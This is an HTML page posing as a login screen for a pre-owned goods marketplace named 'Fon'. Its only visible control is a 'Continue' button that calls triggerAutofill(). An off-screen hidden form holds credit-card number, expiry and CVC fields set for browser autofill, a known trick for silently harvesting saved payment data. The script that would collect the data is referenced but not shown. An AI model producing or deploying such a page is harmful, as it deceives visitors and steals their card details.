<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Page</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <div class="login-container">
        <img src="path_to_logo.png" alt="pre-owned items" style="width: 100px; margin-bottom: 20px;">
        <h1>Buy and sell pre-owned items here:</h1>
        <form id="loginForm">
            <!-- Button to trigger autofill -->
            <button type="button" onclick="triggerAutofill()">Continue ➡️</button>
        </form>
        <p><a href="#">Welcome to Fon, you can easily sell and buy items here</a></p>
        <p class="privacy">At Fon, a large number of items have been bought and sold. <a href="#">Thank you for choosing Fon</a>.</p>
    </div>

    <!-- Hidden Form for Autofill -->
    <form id="hiddenForm" style="position: absolute; top: -9999px;">
        <input type="text" name="cc-number" autocomplete="cc-number" placeholder="Credit Card Number">
        <input type="text" name="cc-exp" autocomplete="cc-exp" placeholder="MM/YY">
        <input type="text" name="cc-cvc" autocomplete="cc-cvc" placeholder="CVC">
    </form>

    <!-- JavaScript -->
    <script src="script.js"></script>
</body>
</html>
